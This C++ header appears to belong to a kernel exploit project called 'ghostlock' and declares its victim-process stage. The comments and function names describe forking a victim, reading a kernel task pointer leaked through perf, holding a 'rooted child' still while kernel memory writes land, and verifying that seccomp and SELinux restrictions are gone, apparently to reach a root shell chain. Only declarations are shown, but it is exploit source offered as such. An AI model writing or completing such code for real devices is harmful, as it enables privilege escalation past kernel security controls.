#ifndef GHOSTLOCK_VICTIM_PROCESS_HPP
#define GHOSTLOCK_VICTIM_PROCESS_HPP

#include "common.h"
#include "session/victim_context.hpp"

#include <optional>

namespace ghostlock::session::victim {
    /* Verification contexts handed to retry_write_stage callbacks. */
    struct w2_stage_context {
        VictimContext &pipes;
    };

    struct w3_stage_context {
        VictimContext &pipes;
        int32_t leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
    };

    /* Fork the victim and read back the task pointer perf leaked. Returns
     * nullopt when the fork/pipe setup failed (retryable). */
    struct VictimSpawn {
        pid_t pid;
        uintptr_t task;
    };

    std::optional<VictimSpawn> spawn_victim(VictimContext &p);

    /* W3 sanitize window. stop_child() parks the rooted child in a group stop
 * (the 'S' protocol step) so no syscall of its own can run while the kernel
 * writes land; continue_and_report_seccomp() resumes it with SIGCONT and
 * returns the seccomp mode the task then reports, or -1 when it did not
 * answer. A caller that fails after stop_child() must still resume the child
 * (continue_and_report_seccomp or SIGCONT) before parking or retiring it. */
    int32_t stop_child(VictimContext &p);

    int32_t continue_and_report_seccomp(VictimContext &p);

    /* Stage verification callbacks. */
    int32_t verify_selinux_stage(void *context);

    int32_t verify_w2_stage(void *context);

    /* The verdict: a forked child must also report `Seccomp: 0`, which proves
 * kernel/fork.c copy_seccomp() stopped re-arming TIF_SECCOMP (the property the
 * `sh -> ksud` chain needs). Unambiguous, unlike the finit_module errno. */
    int32_t verify_fork_seccomp_stage(void *context);

    /* Informational only: logs the finit_module errno field. -ESRCH cannot
 * distinguish a filtered syscall from an unfiltered one with a bogus fd, so
 * this never returns a pass/fail verdict (see the corrected comment in the
 * implementation). */
    void probe_finit_module_stage(void *context);

    int32_t verify_leaf_dir_stage(void *context);
} // namespace ghostlock::session::victim

#endif
